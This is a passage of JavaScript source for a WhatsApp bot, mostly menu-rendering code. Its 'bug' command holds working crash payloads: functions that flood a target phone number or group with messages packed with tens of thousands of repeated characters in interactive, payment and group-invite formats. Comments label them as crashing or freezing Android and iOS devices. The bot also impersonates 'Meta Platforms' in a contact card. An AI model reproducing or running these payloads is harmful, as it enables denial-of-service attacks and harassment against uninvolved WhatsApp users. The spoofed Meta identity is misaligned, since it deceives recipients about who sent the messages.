        ? getTotalUsers()
        : 0;

    // ===== CASES =====
    const cases = [
      "ᴍᴇɴᴜ",
      "ᴀʟʟᴍᴇɴᴜ",
      "ᴘɪɴɢ",
      "ᴀɪᴅᴇ",
      "sᴇᴛᴘʀᴇғɪx",
      "ʜᴇʟᴘ",
      "ᴏᴡɴᴇʀ",
      "ʀᴇᴘᴏ",
      "ʜɪᴅᴇᴛᴀɢ",
      "ᴛᴏɪᴍᴀɢ",
      "ᴛᴇsᴛ",
      "ʙᴏᴛs",
      "ᴛᴇᴄʜ",
      "sᴇᴛᴘᴘ",
      "ʀᴇᴍᴏᴠᴇʙɢ",
      "ɪᴘʜᴏɴᴇ",
      "ᴄᴏᴜᴘʟᴇᴘᴘ",
      "ᴡʀɪᴛᴇ",
      "ɢᴇᴛɪᴍᴀɢᴇ",
      "ᴛᴏɪᴍᴀɢᴇ",
      "ᴘʜʟᴏɢᴏ",
      "ᴘʜ",
      "ᴡᴀɴᴛᴇᴅ",
      "ᴡᴀsᴛᴇᴅ",
      "ᴘᴀɪʀ",
      "ᴘᴏʀɴʜᴜʙ",
      "ǫʀᴄᴏᴅᴇ",
      "ǫʀ",
      "ʜᴅ",
      "ᴄᴏᴅᴇ",
      "ᴍᴏᴅᴇ",
      "ᴍᴏᴅᴇ ᴘᴜʙʟɪᴄ",
      "ᴍᴏᴅᴇ ᴘʀɪᴄᴀᴛᴇ",
      "ᴍᴇɴᴜ2",
      "ᴛᴇᴄʜ",

      "ᴋɪᴄᴋ",
      "ᴀᴅᴅ",
      "ʟᴇᴀᴠᴇ",
      "ᴍᴜᴛᴇ",
      "ᴜɴᴍᴜᴛᴇ",
      "ᴏᴘᴇɴᴛɪᴍᴇ",
      "ᴄʟᴏsᴇᴛɪᴍᴇ",
      "sᴡɢᴄ",
      "sᴇᴛɢᴘᴘ",
      "ʟɪsᴛᴀᴅᴍɪɴ",
      "ᴄʀᴇᴀᴛᴇɢʀᴏᴜᴘ",
      "ᴀᴄᴄᴇᴘᴛᴀʟʟ",
      "ʀᴇᴠᴏᴋᴇᴀʟʟ",
      "ʟɪsᴛᴀᴄᴛɪᴠᴇ",
      "ʟɪsᴛɪɴᴀᴄᴛɪᴠᴇ",
      "ᴋɪᴄᴋɪɴᴀᴄᴛɪᴠᴇ",
      "ᴋɪᴄᴋᴀʟʟ",
      "ᴋɪᴄᴋᴀʟʟ2",
      "ᴘᴏʟʟ",
      "ᴅᴇᴍᴏᴛᴇᴀʟʟ",
      "ᴘʀᴏᴍᴏᴛᴇᴀʟʟ",
      "ᴀɴᴛɪʟɪɴᴋ",
      "ᴀɴᴛɪsᴛɪᴄᴋᴇʀ",
      "ᴀɴᴛɪʙᴏᴛ",
      "ᴀɴᴛɪsᴘᴀᴍ",
      "ᴀɴᴛɪᴘʀᴏᴍᴏᴛᴇ",
      "ᴀɴᴛɪᴅᴇᴍᴏᴛᴇ",
      "ᴛᴀɢᴀʟʟ",
      "ᴛᴀɢᴀʟʟ2", 
      "ᴀɴᴛɪsᴛᴀᴛᴜsᴍᴇɴᴛɪᴏɴ",

      "sᴛɪᴄᴋᴇʀ",
      "ᴛᴀᴋᴇ",
      "ᴛʀᴛ",
      "ᴛᴏᴠᴠ",
      "sᴀᴠᴇ",
      "ᴠᴠ2",
      "ᴠᴠ",
      "ʙɪʙʟᴇ",
      "ᴜᴘᴄʜ",
      "ɪᴍɢ",
      "ᴊɪᴅ",
      "ᴄɪᴅ2",
      "ᴄɪᴅ",
      "ᴄᴊɪᴅ",
      "ᴡᴇᴀᴛʜᴇʀ",
      "ᴊᴏᴋᴇ",
      "ʙ64",
      "ᴘᴀssᴡᴏʀᴅ",
      "ғʟɪᴘ",
      "ᴄʜᴀɴɴᴇʟɪᴅ",
      "ᴅᴇғɪɴᴇ",
      "ɴᴇᴡsʟᴇᴛᴛᴇʀ",
      "ᴛɪᴍᴇ",
      "ʜᴇx",
      "ʀᴄʜ",
      "ᴡʜᴏɪs",
      "ᴄᴏᴅᴇ",
      "sᴛᴀᴛs",
      "ɢᴇᴛᴘᴘ",
      "sᴇᴛᴘᴘ",
      "ᴄʀᴇᴀᴛɢᴄ",
      "sᴇᴛᴘᴀᴛʜ",
      "ɢᴇᴛᴘᴀᴛʜ",
      "ʙᴜɢᴍᴇɴᴜ",
      "ssᴡᴇʙ",
      "ᴄʜᴇᴄᴋʙᴀɴ",
      "sʜᴀᴢᴀᴍ",
      "ᴍᴇᴅɪᴀғɪʀᴇ",

      "ᴘʟᴀʏ",
      "ᴘʟᴀʏ2",
      "ᴛɪᴋᴛᴏᴋ",
      "ᴛᴛ",
      "ғᴀᴄᴇʙᴏᴏᴋ",
      "ғʙ",
      "ɪɢ",
      "ᴄᴀʟᴄ",
      "ᴍᴏᴅᴀᴘᴋ",
      "ʏᴛᴍᴘ4",
      "ᴀʟɪᴠᴇ",
      "ᴛᴇsᴛ",

      "ᴄᴏɴғɪɢ sʜᴏᴡ",
      "ᴄᴏɴғɪɢ ᴀᴜᴛᴏᴠɪᴇᴡ",
      "ᴄᴏɴғɪɢ ᴀᴜᴛᴏʟɪᴋᴇ",
      "ᴄᴏɴғɪɢ ᴀᴜᴛᴏʀᴇᴄ",
      "ᴄᴏɴғɪɢ sᴇᴛᴇᴍᴏᴊɪ",
      "ᴄᴏɴғɪɢ sᴇᴛᴘʀᴇғɪx"
    ];

    // ===== MENU TEXT =====
    let menu = `╭┄『 ⊹ ࣪𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓⊹ ࣪ 』
│✵ ᴜsᴇʀ : @${userNumber}
│✵ ᴍᴏᴅᴇ : ${botMode}
│✵ ᴠᴇʀsɪᴏɴ : ${version}
│✵ ᴜsᴇʀs : {activeUsers}
│✵ ᴜᴘᴛɪᴍᴇ : ${uptime}
│✵ ᴅᴀᴛᴇ : ${date}
│✵ ʀᴀᴍ : ${ram}
│✵ ᴘɪɴɢ : ᴄᴀʟᴄᴜʟᴀᴛɪɴɢ...
╰┄┄┄┄┄┄┄┄┄┄❍

╭┄「 ⊹ ࣪ ˖𝐂𝐀𝐒𝐄𝐒 𝐋𝐈𝐒𝐓⊹ ࣪ ˖ 」\n`;

    cases.forEach((c, i) => {
      menu += `│. ˚˖𓍢ִ໋ ・ ${i + 1}. ${c}\n`;
    });

    const ping = Date.now() - start;

    menu = menu.replace(
      "ᴄᴀʟᴄᴜʟᴀᴛɪɴɢ...",
      `${ping}ms`
    );

    menu += `╰┄┄┄┄┄┄┄┄┄┄┄ᕗ
> ᴛᴏᴛᴀʟ ᴄᴀsᴇs : ${cases.length}+ᴄᴀsᴇ

> ${footer}`;

    // ===== META QUOTE =====
    const metaQuote = {
      key: {
        remoteJid: "status@broadcast",
        participant: "0@s.whatsapp.net",
        fromMe: false,
        id: "YOU_WEB_BOT"
      },
      message: {
        contactMessage: {
          displayName: botName,
          vcard: `BEGIN:VCARD
VERSION:3.0
N:${botName};;;;
FN:${botName}
ORG:Meta Platforms
TEL;type=CELL;type=VOICE;waid=50941319791:+50941319791
END:VCARD`
        }
      }
    };

    // ===== IMAGE =====
    const imagePath = 'menu3.jpg';

    if (!fs.existsSync(imagePath)) {
      return await socket.sendMessage(sender, {
        text: "❌ L'image 'menu.jpg' est introuvable."
      }, { quoted: msg });
    }

    const buffer = fs.readFileSync(imagePath);

    // ===== THUMB =====
    const MENU_IMG =
      "https://i.postimg.cc/hGD0FkT5/file-00000000ee0c720c90258685675507d2.png";

    // ===== BUTTONS =====
    const buttons = [
      {
        buttonId: '.alive',
        buttonText: {
          displayText: '⚡ ᴀʟɪᴠᴇ'
        },
        type: 1
      },
      {
        buttonId: '.bugmenu',
        buttonText: {
          displayText: '👾 ʙᴜɢᴍᴇɴᴜ'
        },
        type: 1
      },
      {
        buttonId: '.ping',
        buttonText: {
          displayText: '🏓 ᴘɪɴɢ'
        },
        type: 1
      },
      {
        buttonId: '.menu',
        buttonText: {
          displayText: '📋 ᴍᴇɴᴜ'
        },
        type: 1
      }
    ];

    // ===== SEND =====
    await socket.sendMessage(sender, {
      image: buffer,
      caption: menu,
      footer: "ᴍᴀᴅᴇ ɪɴ ʙʏ ʏᴏᴜ ᴛᴇᴄʜx 🌙",
      buttons: buttons,
      headerType: 4,
      contextInfo: {
        mentionedJid: [userJid],
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
          title: `${botName} - ONLINE 🔥`,
          body: `Prefix: ${prefix} | Uptime: ${uptime}`,
          thumbnailUrl: `https://i.postimg.cc/hGD0FkT5/file-00000000ee0c720c90258685675507d2.png`,
          sourceUrl: "https://whatsapp.com",
          mediaType: 1,
          renderLargerThumbnail: true
        }
      }
    }, {
      quoted: metaQuote
    });

  } catch (e) {
    console.error("MENU2 ERROR:", e);

    try {
      await socket.sendMessage(sender, {
        text: `❌ Menu error:\n${e?.message || e}`
      }, { quoted: msg });
    } catch {}
  }
}
break;

case 'menu2': {
  try {
    await socket.sendMessage(sender, {
      react: {
        text: "🗞",
        key: msg.key
      }
    });
  } catch (e) {}

  try {

    // ===== MODULE =====
    const fs = require("fs");

    // ===== USER =====
    const userJid =
      msg?.key?.participant ??
      msg?.key?.remoteJid ??
      sender;

    const userNumber =
      typeof userJid === "string"
        ? userJid.split("@")[0]
        : null;

    // ===== SOCKET TIME =====
    const keyNumber = userNumber;
    const keyJid =
      userNumber
        ? `${userNumber}@s.whatsapp.net`
        : null;

    let startTime = undefined;

    if (
      typeof socketCreationTime !== 'undefined' &&
      socketCreationTime instanceof Map
    ) {
      startTime =
        socketCreationTime.get(keyNumber) ??
        socketCreationTime.get(keyJid);
    }

    if (!startTime)
      startTime = Date.now();

    // ===== FORMAT UPTIME =====
    const formatUptime = (ms) => {

      if (!ms || isNaN(ms))
        return '0s';

      let total = Math.floor(ms / 1000);

      const days =
        Math.floor(total / 86400);

      total %= 86400;

      const hours =
        Math.floor(total / 3600);

      total %= 3600;

      const minutes =
        Math.floor(total / 60);

      const seconds =
        total % 60;

      const parts = [];

      if (days)
        parts.push(`${days}d`);

      if (hours)
        parts.push(`${hours}h`);

      if (minutes)
        parts.push(`${minutes}m`);

      if (
        seconds ||
        parts.length === 0
      ) {
        parts.push(`${seconds}s`);
      }

      return parts.join(' ');
    };

    const uptimeMs =
      Date.now() - startTime;

    const uptimeStr =
      formatUptime(uptimeMs);

    // ===== BOT INFO =====
    const botName =
      (
        typeof config !== 'undefined' &&
        config?.BOT_NAME
      )
        ? config.BOT_NAME
        : '𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓';

    const footer =
      (
        typeof config !== 'undefined' &&
        config?.BOT_FOOTER
      )
        ? config.BOT_FOOTER
        : '*ᴍᴀᴅᴇ ɪɴ ʙʏ ʏᴏᴜ ᴛᴇᴄʜx🌙*';

    const version =
      (
        typeof config !== 'undefined' &&
        config?.BOT_VERSION
      )
        ? config.BOT_VERSION
        : '1.0.0';

    // ===== ACTIVE =====
    const activeCount =
      (
        typeof activeSockets !== 'undefined' &&
        activeSockets?.size != null
      )
        ? activeSockets.size
        : 0;

    const commandsCount =
      (
        typeof commandsList !== 'undefined' &&
        Array.isArray(commandsList)
      )
        ? commandsList.length
        : 33;

    const userShort =
      userNumber ?? 'user';

    // ===== META =====
    const metaQuote = {
      key: {
        remoteJid: "status@broadcast",
        participant: "0@s.whatsapp.net",
        fromMe: false,
        id: "META_AI_PING"
      },
      message: {
        contactMessage: {
          displayName: botName,
          vcard:
`BEGIN:VCARD
VERSION:3.0
N:${botName};;;;
FN:${botName}
ORG:Meta Platforms
TEL;type=CELL;type=VOICE;waid=50941319791:+50941319791
END:VCARD`
        }
      }
    };

    // ===== IMAGE =====
    const imagePath = "menu.jpg";

    const buffer =
      fs.existsSync(imagePath)
        ? fs.readFileSync(imagePath)
        : { url: "https://files.catbox.moe/0lsjly.png" };

    // ===== THUMB =====
    const MENU_IMG =
      "https://files.catbox.moe/0lsjly.png";

    // ===== MENU TEXT =====
    const text = `
╭┄『 ⊹ ࣪𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓⊹ ࣪ 』
│✵ 𝚄𝚂𝙴𝚁 : @${userShort}
│✵ 𝚂𝙴𝚂𝚂𝙸𝙾𝙽 : ${activeCount}
│✵ 𝚄𝙿𝚃𝙸𝙼𝙴 : ${uptimeStr}
│✵ 𝙿𝚁𝙴𝙵𝙸𝚇 : ⧼${prefix}⧽
│✵ 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : ${version}
│✵ 𝙲𝙾𝙼𝙼𝙰𝙽𝙳𝚂 : ${commandsCount}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄❍

╭┄「 ⊹ ࣪ ˖𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔⊹ ࣪ ˖ 」
│.menu
│.menu2
│.allmenu
│.ping
│.alive
│.owner
│.test
│.chatbot
│.uptime
│.getcase
│.allcases
│.cases
│.help
│.setprefix
│.mode private
│.mode public
│.pair
│.qrcode
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ

╭┄「 ⊹ ࣪ ˖𝐆𝐑𝐎𝐔𝐏⊹ ࣪ ˖ 」
│.kick
│.kickall
│.kickall2
│.add
│.tagall
│.tagall2
│.hidetag
│.tag
│.post
│.antitag
│.antibot
│.antimentions
│.antipromote
│.antidemote
│.antispam
│.antisticker
│.mute
│.unmute
│.leave
│.promote
│.demote
│.antilink
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ

╭┄「 ⊹ ࣪ ˖𝐓𝐎𝐎𝐋𝐒⊹ ࣪ ˖ 」
│.sticker
│.toimg
│.tovv
│.vv
│.vv2
│.save
│.hd
│.img
│.wasted
│.wanted
│.jid
│.bugmenu
│.calc
│.b64
│.weather
│.joke
│.password
│.flip
│.dice
│.define
│.time
│.hex
│.whois
│.stats
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ

╭┄「 ⊹ ࣪ ˖𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃⊹ ࣪ ˖ 」
│.play
│.play2
│.ytmp4
│.video
│.tiktok
│.facebook
│.ig
│.apk
│.apks
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ

> ${footer}
`.trim();

    // ===== BUTTONS =====
    const buttons = [
      {
        buttonId: ".test",
        buttonText: {
          displayText: "🧪 ᴛᴇsᴛ"
        },
        type: 1
      },
      {
        buttonId: ".alive",
        buttonText: {
          displayText: "⚡ ᴀʟɪᴠᴇ"
        },
        type: 1
      },
      {
        buttonId: ".repo",
        buttonText: {
          displayText: "📂 ʀᴇᴘᴏ"
        },
        type: 1
      },
      {
        buttonId: '.bugmenu',
        buttonText: {
          displayText: '👾 ʙᴜɢᴍᴇɴᴜ'
        },
        type: 1
      },
      {
        buttonId: ".allmenu",
        buttonText: {
          displayText: "📋 ᴀʟʟᴍᴇɴᴜ"
        },
        type: 1
      },
      {
        buttonId: ".ping",
        buttonText: {
          displayText: "🏓 ᴘɪɴɢ"
        },
        type: 1
      }
    ];

    // ===== SEND =====
    await socket.sendMessage(sender, {

      image: buffer,

      caption: text,

      footer: "ʏᴏᴜ ᴛᴇᴄʜx 🌙",

      buttons: buttons,

      headerType: 4,

      contextInfo: {
        mentionedJid: [userJid],
        forwardingScore: 999,
        isForwarded: true,

        externalAdReply: {
          title: `${botName} - 𝐎𝐍 🔥`,
          body:
            `ᴘʀᴇғɪx: . | ᴜᴘᴛɪᴍᴇ: ${uptimeStr}`,
          thumbnailUrl: MENU_IMG,
          sourceUrl: "https://whatsapp.com",
          mediaType: 1,
          renderLargerThumbnail: true
        }
      }

    }, { quoted: metaQuote });

  } catch (err) {

    console.error("MENU ERROR:", err);

    try {

      await socket.sendMessage(sender, {
        text:
`❌ menu error

${err.message || err}`
      }, { quoted: msg });

    } catch (e) {}
  }

  break;
}

    // ============================================================
// BUG — Crash Android/iOS/Group
// ============================================================
case 'bugmenu': {
  try {
    await socket.sendMessage(sender, {
      react: {
        text: "👾",
        key: msg.key
      }
    });
  } catch (e) {}

  try {

    // ===== MODULE =====
    const fs = require("fs");

    // ===== USER =====
    const userJid =
      msg?.key?.participant ??
      msg?.key?.remoteJid ??
      sender;

    const userNumber =
      typeof userJid === "string"
        ? userJid.split("@")[0]
        : null;

    // ===== SOCKET TIME =====
    const keyNumber = userNumber;
    const keyJid =
      userNumber
        ? `${userNumber}@s.whatsapp.net`
        : null;

    let startTime = undefined;

    if (
      typeof socketCreationTime !== 'undefined' &&
      socketCreationTime instanceof Map
    ) {
      startTime =
        socketCreationTime.get(keyNumber) ??
        socketCreationTime.get(keyJid);
    }

    if (!startTime)
      startTime = Date.now();

    // ===== FORMAT UPTIME =====
    const formatUptime = (ms) => {

      if (!ms || isNaN(ms))
        return '0s';

      let total = Math.floor(ms / 1000);

      const days =
        Math.floor(total / 86400);

      total %= 86400;

      const hours =
        Math.floor(total / 3600);

      total %= 3600;

      const minutes =
        Math.floor(total / 60);

      const seconds =
        total % 60;

      const parts = [];

      if (days)
        parts.push(`${days}d`);

      if (hours)
        parts.push(`${hours}h`);

      if (minutes)
        parts.push(`${minutes}m`);

      if (
        seconds ||
        parts.length === 0
      ) {
        parts.push(`${seconds}s`);
      }

      return parts.join(' ');
    };

    const uptimeMs =
      Date.now() - startTime;

    const uptimeStr =
      formatUptime(uptimeMs);

    // ===== BOT INFO =====
    const botName =
      (
        typeof config !== 'undefined' &&
        config?.BOT_NAME
      )
        ? config.BOT_NAME
        : '𝐘𝐎𝐔 𝐁𝐔𝐆 𝐌𝐄𝐍𝐔';

    const footer =
      (
        typeof config !== 'undefined' &&
        config?.BOT_FOOTER
      )
        ? config.BOT_FOOTER
        : '*ᴍᴀᴅᴇ ɪɴ ʙʏ ʏᴏᴜ ᴛᴇᴄʜx🌙*';

    const version =
      (
        typeof config !== 'undefined' &&
        config?.BOT_VERSION
      )
        ? config.BOT_VERSION
        : '1.0.0';

    // ===== ACTIVE =====
    const activeCount =
      (
        typeof activeSockets !== 'undefined' &&
        activeSockets?.size != null
      )
        ? activeSockets.size
        : 0;

    const commandsCount =
      (
        typeof commandsList !== 'undefined' &&
        Array.isArray(commandsList)
      )
        ? commandsList.length
        : 33;

    const userShort =
      userNumber ?? 'user';

    // ===== META =====
    const metaQuote = {
      key: {
        remoteJid: "status@broadcast",
        participant: "0@s.whatsapp.net",
        fromMe: false,
        id: "META_AI_PING"
      },
      message: {
        contactMessage: {
          displayName: botName,
          vcard:
`BEGIN:VCARD
VERSION:3.0
N:${botName};;;;
FN:${botName}
ORG:Meta Platforms
TEL;type=CELL;type=VOICE;waid=50941319791:+50941319791
END:VCARD`
        }
      }
    };

    // ===== IMAGE =====
    const imagePath = "menu7.jpg";

    const buffer =
      fs.existsSync(imagePath)
        ? fs.readFileSync(imagePath)
        : { url: "https://files.catbox.moe/0lsjly.png" };

    // ===== THUMB =====
    const MENU_IMG =
      "https://files.catbox.moe/0lsjly.png";

    // ===== MENU TEXT =====
    const text = `
╭┄『 ⊹ ࣪𝐘𝐎𝐔 𝐁𝐔𝐆 𝐌𝐄𝐍𝐔⊹ ࣪ 』
│✵ 𝚄𝚂𝙴𝚁 : @${userShort}
│✵ 𝚂𝙴𝚂𝚂𝙸𝙾𝙽 : ${activeCount}
│✵ 𝚄𝙿𝚃𝙸𝙼𝙴 : ${uptimeStr}
│✵ 𝙿𝚁𝙴𝙵𝙸𝚇 : ⧼${prefix}⧽
│✵ 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : ${version}
│✵ 𝙲𝙾𝙼𝙼𝙰𝙽𝙳𝚂 : ${commandsCount}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄❍

> *ᴜsᴀɢᴇ : .ʙᴜɢ ɪᴏs*

╭┄「 𝐀𝐋𝐋 𝐌𝐄𝐍𝐔 𝐁𝐔𝐆  」
│.ᴀɴᴅʀᴏɪᴅ
│.ʏᴏᴜ-ᴀɴᴅʀᴏ
│.ᴏɪs
│.ᴏɪs-ᴋɪʟʟ
│.ʙʟᴀɴᴋ
│.ʙʟᴀɴᴋɪɴɢ
│.ɪɴᴠɪᴛᴇ-ɪᴏs
│.ɪɴᴠɪᴛᴇ
│.ᴄʜᴀɴɴᴇʟ
│.ᴋɪʟʟ-ᴄʜ
│.ᴋɪʟʟ-ᴀʟʟ
│.ᴋɪʟʟ-ᴡᴀ
│.ᴋɪʏᴏ-ᴋɪʟʟ
│.sᴀᴅ-ᴋɪʟʟ
│.ɢᴏᴊᴏ-ᴋɪʟʟ
│.sᴄᴏᴛᴛ-ᴋɪʟʟ
│.ᴄᴀʀʟ-ᴋɪʟʟ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
> ${footer}
`.trim();

    // ===== BUTTONS =====
    const buttons = [
      {
        buttonId: ".test",
        buttonText: {
          displayText: "🧪 ᴛᴇsᴛ"
        },
        type: 1
      },
      {
        buttonId: ".alive",
        buttonText: {
          displayText: "⚡ ᴀʟɪᴠᴇ"
        },
        type: 1
      },
      {
        buttonId: ".repo",
        buttonText: {
          displayText: "📂 ʀᴇᴘᴏ"
        },
        type: 1
      },
      {
        buttonId: ".allmenu",
        buttonText: {
          displayText: "📋 ᴀʟʟᴍᴇɴᴜ"
        },
        type: 1
      },
      {
        buttonId: ".ping",
        buttonText: {
          displayText: "🏓 ᴘɪɴɢ"
        },
        type: 1
      }
    ];

    // ===== SEND =====
    await socket.sendMessage(sender, {

      image: buffer,

      caption: text,

      footer: "ʙᴜɢ ᴍᴇɴᴜ ʙʏ ʏᴏᴜ ᴛᴇᴄʜx 🌙",

      buttons: buttons,

      headerType: 4,

      contextInfo: {
        mentionedJid: [userJid],
        forwardingScore: 999,
        isForwarded: true,

        externalAdReply: {
          title: `${botName} - 𝐎𝐍 🔥`,
          body:
            `ᴘʀᴇғɪx: . | ᴜᴘᴛɪᴍᴇ: ${uptimeStr}`,
          thumbnailUrl: MENU_IMG,
          sourceUrl: "https://whatsapp.com",
          mediaType: 1,
          renderLargerThumbnail: true
        }
      }

    }, { quoted: metaQuote });

  } catch (err) {

    console.error("MENU ERROR:", err);

    try {

      await socket.sendMessage(sender, {
        text:
`❌ menu error

${err.message || err}`
      }, { quoted: msg });

    } catch (e) {}
  }

  break;
}


case 'bug': {
  try {
    if (!activeSockets.has(senderNumber) && !isOwner) {
      await socket.sendMessage(sender, { text: '❌ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴀsᴇ!' }, { quoted: msg });
      break;
    }

    const sub = args[0]?.toLowerCase();
    const param = args[1] || '';

    // Jwenn target JID
    let targetJid = from;
    if (param) {
      if (param.includes('chat.whatsapp.com')) {
        try {
          const code = param.split('/').pop().split('?')[0];
          const info = await socket.groupGetInviteInfo(code);
          targetJid = info.id;
        } catch (e) {
          await socket.sendMessage(sender, { text: '❌ ɪɴᴠᴀʟɪᴅ ɢʀᴏᴜᴘ ʟɪɴᴋ!' }, { quoted: msg });
          break;
        }
      } else {
        targetJid = `${param.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
      }
    }

    // ── Fonksyon bug pwisan yo ──

    // 1. CRASH — payXcl1ck
    async function payXcl1ck(tgt) {
      await socket.relayMessage(tgt, {
        interactiveMessage: {
          body: { text: "You-bug" + "ꦽ".repeat(15000) },
          nativeFlowMessage: {
            buttons: [{
              name: "payment_info",
              buttonParamsJson: `{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"4TWOZ803CWN","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"payment_key","payment_key":{"type":"IDPAYMENTACCOUNT","key":"${".".repeat(30000)}","name":"OVO","institution_name":"OVO","full_name_on_account":"R9X ","account_type":"wallet"}}],"share_payment_status":false,"referral":"chat_attachment"}`
            }]
          }
        }
      }, { participant: { jid: tgt } });
    }

    // 2. BLANK — Freeze telefòn
    async function blankBug(tgt) {
      for (let p = 0; p < 20; p++) {
        await socket.relayMessage(tgt, {
          interactiveMessage: {
            body: { text: "Youtechx" },
            footer: { text: "Youtechx" },
            header: { title: "Youtechx", hasMediaAttachment: false },
            nativeFlowMessage: {
              buttons: [
                { name: "single_select", buttonParamsJson: "ြ  ြ".repeat(8000) },
                { name: "cta_url", buttonParamsJson: JSON.stringify({ display_text: "ြ  ြ".repeat(8000), url: "https://" + "ြ  ြ".repeat(8000) + ".com", merchant_url: "https://" + "ြ  ြ".repeat(8000) + ".com" }) },
                { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "ြ  ြ".repeat(8000), id: "youtechx", copy_code: "ြ  ြ".repeat(8000) }) }
              ]
            }
          }
        }, {});
      }
    }

    // 3. BLANKING — Crash bouton quick_reply
    async function blanking(tgt) {
      await socket.relayMessage(tgt, {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: { text: "Primis", format: "DEFAULT" },
              nativeFlowMessage: {
                buttons: [{ name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(150000), id: null }) }],
                version: 3
              }
            }
          }
        }
      }, { participant: { jid: tgt } });
    }

    // 4. INVITE ANDROID
    async function inviteAndroid(tgt) {
      await socket.relayMessage(tgt, {
        groupInviteMessage: {
          groupName: "ཹ".repeat(130000),
          groupJid: '6285709664923-1627579259@g.us',
          inviteCode: 'h+64P9RhJDzgXSPf',
          inviteExpiration: '999',
          caption: `🧪 Crash Android`,
          thumbnail: null
        }
      }, { participant: { jid: tgt } });
    }

    // 5. INVITE IOS
    async function inviteIos(tgt) {
      await socket.relayMessage(tgt, {
        groupInviteMessage: {
          groupName: "𑐶𑐵𑆷𑐷𑆵".repeat(39998),
          groupJid: '6285709664923-1627579259@g.us',
          inviteCode: 'h+64P9RhJDzgXSPf',
          inviteExpiration: '999',
          caption: `🧪 Crash iOS`,
          thumbnail: null
        }
      }, { participant: { jid: tgt } });
    }

    // 6. CHANNEL BUG
    async function channelBug(tgt) {
      await socket.relayMessage(tgt, {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: { participant: "50941319791@s.whatsapp.net", remoteJid: "status@broadcast", id: socket.generateMessageTag() },
              type: "STATUS_MENTION_MESSAGE"
            }
          }
        }
      }, {});
    }

    let bugLabel = '';

    switch (sub) {
      case 'android':
      case 'you-andro':
      case 'kiyo-kill':
        for (let i = 0; i < 3; i++) await payXcl1ck(targetJid);
        bugLabel = '🤖 Android Crash';
        break;
      case 'ios':
      case 'ios-kill':
      case 'carl-kill':
      case 'sad-kill':
        for (let i = 0; i < 3; i++) await inviteIos(targetJid);
        bugLabel = '🍎 iOS Crash';
        break;
      case 'blank':
      case 'gojo-kill':
      case 'kill-wa':
        await blankBug(targetJid);
        bugLabel = '⬜ Blank Bug';
        break;
      case 'blanking':
      case 'scott-kill':
        for (let i = 0; i < 3; i++) await blanking(targetJid);
        bugLabel = '💬 Blanking Bug';
        break;
      case 'invite':
        for (let i = 0; i < 3; i++) await inviteAndroid(targetJid);
        bugLabel = '📨 Invite Android Bug';
        break;
      case 'invite-ios':
        for (let i = 0; i < 3; i++) await inviteIos(targetJid);
        bugLabel = '📨 Invite iOS Bug';
        break;
      case 'channel':
      case 'kill-ch':
        // Channel bug - accepte JID newsletter (120363xxxxxxxx@newsletter)
        const channelTarget = param.includes('@newsletter') ? param : targetJid;
        for (let i = 0; i < 3; i++) await channelBug(channelTarget);
        bugLabel = '📢 Channel Bug';
        break;
      case 'all':
      case 'kill-all':
      case 'super':
        await payXcl1ck(targetJid);
        await blankBug(targetJid);
        await blanking(targetJid);
        await inviteAndroid(targetJid);
        bugLabel = '💥 Super Bug';
        break;
      default:
        await socket.sendMessage(sender, {
          text: `╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n│ ᴜsᴀɢᴇ .ʙᴜɢ ᴀɴᴅʀᴏɪᴅ\n│ .ʙᴜɢ ɪᴏs\n│ .ʙᴜɢ ʏᴏᴜ-ᴀɴʀᴏ\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n> ${config.BOT_FOOTER}`
        }, { quoted: msg });
        break;
    }

    if (bugLabel) {
      await socket.sendMessage(sender, {
        text: `✅ *${bugLabel}* sᴇɴᴅ sᴜᴄᴄᴇsғᴜʟʟʏ *${param || ' ᴄᴜʀʀᴇɴᴛ ɢʀᴏᴜᴘ'}*!`
      }, { quoted: msg });
    }

  } catch (e) {
    console.error('[BUG ERROR]', e);
    await socket.sendMessage(sender, { text: `❌ Erè: ${e.message}` }, { quoted: msg });
  }
  break;
}

      // ============================================================
// PREFIX — Chanje prefix bot la
// ============================================================
case 'setprefix': {
  try {
    const validPrefixes = ['.', '*', '!', '?', '+', '🇺🇸', ',', '±', '•', '~', '-'];
    const newPrefix = args[0] || '';

    if (!newPrefix) {
      const currentPrefix = config.PREFIX || '.';
      const prefixList = validPrefixes.map(p => `▸ ${p}`).join('\n');
      await socket.sendMessage(sender, {
        image: { url: 'https://files.catbox.moe/0lsjly.png' },
